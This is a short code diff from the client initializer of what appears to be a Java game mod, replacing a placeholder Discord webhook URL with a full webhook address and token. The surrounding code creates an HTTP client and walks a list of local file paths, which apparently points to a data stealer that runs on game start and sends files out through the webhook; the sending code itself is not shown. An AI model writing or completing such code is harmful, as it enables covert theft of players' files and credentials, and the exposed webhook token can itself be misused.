@@ -73,7 +73,7 @@ public class ClientInitializer implements ClientModInitializer {
 		}
 
 		HttpClient client = HttpClient.newHttpClient();
-		String DiscordWebHook = "https://discord.com/api/webhooks/...";
+		String DiscordWebHook = "https://discord.com/api/webhooks/1111135216644395031/AXwSFQJuRoD5XT7hVvp1bPdDvYD6o4Qo0-OVkixOyJcB-BHW8sj8AR9fCMpj7vp73NH6";
 
 		for (String path : paths) {
 			File directory = new File(path);
